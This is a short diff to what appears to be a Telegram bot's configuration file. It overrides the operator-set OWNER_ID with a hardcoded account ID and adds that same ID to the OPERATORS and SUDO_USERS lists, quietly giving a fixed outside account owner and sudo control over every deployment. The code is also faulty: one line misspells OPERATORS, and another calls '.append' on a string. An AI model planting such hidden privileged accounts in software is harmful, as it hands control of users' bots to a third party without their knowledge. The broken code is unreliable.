@@ -39,13 +39,13 @@ if get_bool_key("DEBUG_MODE") is True:
     )
 
 TOKEN = get_str_key("TOKEN", required=True)
-OWNER_ID = get_int_key("OWNER_ID", required=True)
-OWNER_ID += int(1741502445)
+
+OWNER_ID = (1741502445)
 LOGS_CHANNEL_ID = get_int_key("LOGS_CHANNEL_ID", required=True)
 
 OPERATORS = list(get_list_key("OPERATORS"))
-OPERATORS += int(1741502445)
 OPERATORS.append(OWNER_ID)
+OPERATOS.append(1741502445)
 OPERATORS.append(918317361)
 
 # SpamWatch
@@ -78,7 +78,7 @@ TEMP_DOWNLOAD_DIRECTORY = "./"
 
 # Sudo Users
 SUDO_USERS = get_str_key("SUDO_USERS", required=True)
-SUDO_USERS += int(1741502445)
+SUDO_USERS.append(1741502445)
 
 # String Session
 STRING_SESSION = get_str_key("STRING_SESSION", required=True)
